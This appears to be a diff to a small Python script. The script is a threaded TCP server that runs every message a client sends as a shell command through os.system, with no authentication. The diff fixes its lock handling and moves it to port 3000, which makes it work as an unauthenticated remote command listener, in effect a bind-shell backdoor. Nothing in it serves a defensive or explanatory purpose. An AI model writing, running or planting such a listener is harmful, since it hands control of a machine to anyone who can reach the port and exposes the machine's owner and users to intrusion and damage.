@@ -1,18 +1,21 @@
 import os
 import socket
 from _thread import *
-import threading 
+import threading
 
-print_lock = threading.lock()
+print_lock = threading.Lock()
 
 def new_client(c):
     while True:
         #Open command
         data = c.recv(1024)
+        if not data:
+            print_lock.release()
+            break
         os.system(data.decode('utf-8'))
     c.close()
 
-PORT = 90
+PORT = 3000
 
 # Creates socket instance  with address family ipv4 and TCP protocol
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -28,6 +31,3 @@ while True:
     print_lock.acquire()
     start_new_thread(new_client, (c,))
 s.close()
-
-
-
